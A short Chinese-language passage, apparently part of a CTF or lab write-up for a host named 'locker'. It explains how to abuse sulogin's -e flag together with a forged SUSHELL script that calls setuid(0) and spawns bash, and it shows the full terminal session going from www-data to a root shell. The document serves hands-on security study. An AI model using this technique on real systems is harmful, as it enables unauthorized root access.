有一个sulogin

这是一个检测SHELL环境的一个程序，那么可以伪造一个SHELL环境来控制shell路径，从而获得shell

而且通过man手册可以看到-e参数可以强制得到一个shell

-e, --force
           If the default method of obtaining the root password from the system via getpwnam(3) fails, then examine /etc/passwd and /etc/shadow to get the
           password. If these files are damaged or nonexistent, or when root account is locked by '!' or '*' at the begin of the password then sulogin will
           start a root shell without asking for a password.

那么可以写一个伪造脚本，进行提权

www-data@locker:/tmp$ cat 1
#!/usr/bin/python3

import os
os.setuid(0)
os.setgid(0)
os.system("/bin/bash")
www-data@locker:/tmp$ chmod 755 1
www-data@locker:/tmp$ export SUSHELL=/tmp/1
www-data@locker:/tmp$ /usr/sbin/sulogin -e
Press Enter for maintenance
(or press Control-D to continue):
root@locker:~# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
